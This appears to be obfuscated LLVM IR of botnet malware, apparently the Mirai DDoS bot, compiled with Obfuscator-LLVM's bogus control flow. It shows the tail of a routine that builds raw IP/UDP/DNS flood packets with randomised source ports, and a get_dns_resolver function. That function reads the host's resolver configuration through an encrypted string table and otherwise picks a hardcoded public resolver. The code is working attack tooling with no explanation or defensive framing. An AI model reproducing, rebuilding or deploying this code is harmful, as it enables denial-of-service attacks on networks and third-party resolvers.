  %693 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %692, i64 1
  %694 = bitcast %struct.iphdr* %693 to %struct.udphdr*
  store %struct.udphdr* %694, %struct.udphdr** %43, align 8
  %695 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %696 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %695, i64 1
  %697 = bitcast %struct.udphdr* %696 to %struct.dnshdr*
  store %struct.dnshdr* %697, %struct.dnshdr** %44, align 8
  %698 = load %struct.dnshdr*, %struct.dnshdr** %44, align 8
  %699 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %698, i64 1
  %700 = bitcast %struct.dnshdr* %699 to i8*
  %701 = getelementptr inbounds i8, i8* %700, i64 1
  store i8* %701, i8** %45, align 8
  %702 = load i16, i16* %21, align 2
  %703 = zext i16 %702 to i32
  %704 = icmp eq i32 %703, 65535
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %450
  %705 = load i16, i16* %25, align 2
  %706 = zext i16 %705 to i32
  %707 = icmp eq i32 %706, 65535
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %470
  %708 = call i32 @rand_next()
  %_39 = sub i32 %708, 65535
  %gen40 = mul i32 %_39, 65535
  %_41 = shl i32 %708, 65535
  %709 = and i32 %708, 65535
  %710 = trunc i32 %709 to i16
  %711 = load %struct.udphdr*, %struct.udphdr** %43, align 8
  %712 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %711, i32 0, i32 1
  store i16 %710, i16* %712, align 2
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 46)
  %11 = call i8* @table_retrieve_val(i32 46, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 46)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %223

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.39
  %17 = load i32, i32* @y.40
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %26 = call i64 @read(i32 %24, i8* %25, i64 2048)
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %3, align 4
  %28 = load i32, i32* %2, align 4
  %29 = call i32 @close(i32 %28)
  call void @table_unlock_val(i8 zeroext 47)
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = load i32, i32* %3, align 4
  %32 = call i8* @table_retrieve_val(i32 47, i32* null)
  %33 = call i32 @util_stristr(i8* %30, i32 %31, i8* %32)
  store i32 %33, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 47)
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, -1
  %36 = load i32, i32* @x.39
  %37 = load i32, i32* @y.40
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %206

; <label>:44:                                     ; preds = %originalBBpart2
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %45 = load i32, i32* %4, align 4
  store i32 %45, i32* %6, align 4
  br label %46

; <label>:46:                                     ; preds = %196, %44
  %47 = load i32, i32* @x.39
  %48 = load i32, i32* @y.40
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* %6, align 4
  %56 = load i32, i32* %3, align 4
  %57 = icmp slt i32 %55, %56
  %58 = load i32, i32* @x.39
  %59 = load i32, i32* @y.40
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %199

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* %6, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  store i8 %70, i8* %10, align 1
  %71 = load i8, i8* %8, align 1
  %72 = icmp ne i8 %71, 0
  br i1 %72, label %116, label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8, i8* %10, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 32
  %85 = load i32, i32* @x.39
  %86 = load i32, i32* @y.40
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %84, label %97, label %93

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i8, i8* %10, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp eq i32 %95, 9
  br i1 %96, label %97, label %114

; <label>:97:                                     ; preds = %93, %originalBBpart28
  %98 = load i32, i32* @x.39
  %99 = load i32, i32* @y.40
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %97
  %106 = load i32, i32* @x.39
  %107 = load i32, i32* @y.40
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %196

; <label>:114:                                    ; preds = %93
  store i8 1, i8* %8, align 1
  br label %115

; <label>:115:                                    ; preds = %114
  br label %116

; <label>:116:                                    ; preds = %115, %66
  %117 = load i8, i8* %10, align 1
  %118 = sext i8 %117 to i32
  %119 = icmp ne i32 %118, 46
  br i1 %119, label %120, label %160

; <label>:120:                                    ; preds = %116
  %121 = load i32, i32* @x.39
  %122 = load i32, i32* @y.40
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  %129 = load i8, i8* %10, align 1
  %130 = sext i8 %129 to i32
  %131 = icmp slt i32 %130, 48
  %132 = load i32, i32* @x.39
  %133 = load i32, i32* @y.40
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %131, label %165, label %140

; <label>:140:                                    ; preds = %originalBBpart216
  %141 = load i32, i32* @x.39
  %142 = load i32, i32* @y.40
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %140
  %149 = load i8, i8* %10, align 1
  %150 = sext i8 %149 to i32
  %151 = icmp sgt i32 %150, 57
  %152 = load i32, i32* @x.39
  %153 = load i32, i32* @y.40
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %151, label %165, label %160

; <label>:160:                                    ; preds = %originalBBpart220, %116
  %161 = load i32, i32* %6, align 4
  %162 = load i32, i32* %3, align 4
  %163 = sub nsw i32 %162, 1
  %164 = icmp eq i32 %161, %163
  br i1 %164, label %165, label %179

; <label>:165:                                    ; preds = %160, %originalBBpart220, %originalBBpart216
  %166 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %168 = load i32, i32* %4, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %167, i64 %169
  %171 = load i32, i32* %6, align 4
  %172 = load i32, i32* %4, align 4
  %173 = sub nsw i32 %171, %172
  call void @util_memcpy(i8* %166, i8* %170, i32 %173)
  %174 = load i32, i32* %6, align 4
  %175 = load i32, i32* %4, align 4
  %176 = sub nsw i32 %174, %175
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %177
  store i8 0, i8* %178, align 1
  store i8 1, i8* %9, align 1
  br label %199

; <label>:179:                                    ; preds = %160
  %180 = load i32, i32* @x.39
  %181 = load i32, i32* @y.40
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %179
  %188 = load i32, i32* @x.39
  %189 = load i32, i32* @y.40
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %196

; <label>:196:                                    ; preds = %originalBBpart224, %originalBBpart212
  %197 = load i32, i32* %6, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %6, align 4
  br label %46

; <label>:199:                                    ; preds = %165, %originalBBpart24
  %200 = load i8, i8* %9, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %205

; <label>:202:                                    ; preds = %199
  %203 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %204 = call i32 @inet_addr(i8* %203) #6
  store i32 %204, i32* %1, align 4
  br label %266

; <label>:205:                                    ; preds = %199
  br label %206

; <label>:206:                                    ; preds = %205, %originalBBpart2
  %207 = load i32, i32* @x.39
  %208 = load i32, i32* @y.40
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %206
  %215 = load i32, i32* @x.39
  %216 = load i32, i32* @y.40
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %223

; <label>:223:                                    ; preds = %originalBBpart228, %0
  %224 = load i32, i32* @x.39
  %225 = load i32, i32* @y.40
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %223
  %232 = call i32 @rand_next()
  %233 = urem i32 %232, 4
  %234 = load i32, i32* @x.39
  %235 = load i32, i32* @y.40
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart234, label %originalBB30alteredBB

originalBBpart234:                                ; preds = %originalBB30
  switch i32 %233, label %266 [
    i32 0, label %242
    i32 1, label %244
    i32 2, label %246
    i32 3, label %248
  ]

; <label>:242:                                    ; preds = %originalBBpart234
  %243 = call i32 @htonl(i32 134744072) #7
  store i32 %243, i32* %1, align 4
  br label %266

; <label>:244:                                    ; preds = %originalBBpart234
  %245 = call i32 @htonl(i32 1246898730) #7
  store i32 %245, i32* %1, align 4
  br label %266

; <label>:246:                                    ; preds = %originalBBpart234
  %247 = call i32 @htonl(i32 1074151430) #7
  store i32 %247, i32* %1, align 4
  br label %266

; <label>:248:                                    ; preds = %originalBBpart234
  %249 = load i32, i32* @x.39
  %250 = load i32, i32* @y.40
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %248
  %257 = call i32 @htonl(i32 67240450) #7
  store i32 %257, i32* %1, align 4
  %258 = load i32, i32* @x.39
  %259 = load i32, i32* @y.40
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %266

; <label>:266:                                    ; preds = %originalBBpart238, %246, %244, %242, %originalBBpart234, %202
  %267 = load i32, i32* %1, align 4
  ret i32 %267

originalBBalteredBB:                              ; preds = %originalBB, %15
  %268 = load i32, i32* %2, align 4
  %269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %270 = call i64 @read(i32 %268, i8* %269, i64 2048)
  %271 = trunc i64 %270 to i32
  store i32 %271, i32* %3, align 4
  %272 = load i32, i32* %2, align 4
  %273 = call i32 @close(i32 %272)
  call void @table_unlock_val(i8 zeroext 47)
  %274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %275 = load i32, i32* %3, align 4
  %276 = call i8* @table_retrieve_val(i32 47, i32* null)
  %277 = call i32 @util_stristr(i8* %274, i32 %275, i8* %276)
  store i32 %277, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 47)
  %278 = load i32, i32* %4, align 4
  %279 = icmp ne i32 %278, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %280 = load i32, i32* %6, align 4
  %281 = load i32, i32* %3, align 4
  %282 = icmp slt i32 %280, %281
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %283 = load i8, i8* %10, align 1
  %284 = sext i8 %283 to i32
  %285 = icmp eq i32 %284, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %97
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  %286 = load i8, i8* %10, align 1
  %287 = sext i8 %286 to i32
  %288 = icmp slt i32 %287, 48
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %140
  %289 = load i8, i8* %10, align 1
  %290 = sext i8 %289 to i32
  %291 = icmp sgt i32 %290, 57
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %179
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %206
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %223
  %292 = call i32 @rand_next()
  %_ = sub i32 0, %292
  %gen = add i32 %_, 4
  %_31 = sub i32 %292, 4
  %gen32 = mul i32 %_31, 4
  %293 = urem i32 %292, 4
  br label %originalBB30

originalBB36alteredBB:                            ; preds = %originalBB36, %248
  %294 = call i32 @htonl(i32 67240450) #7
  store i32 %294, i32* %1, align 4
  br label %originalBB36
}

declare i32 @rand_alphastr(...) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
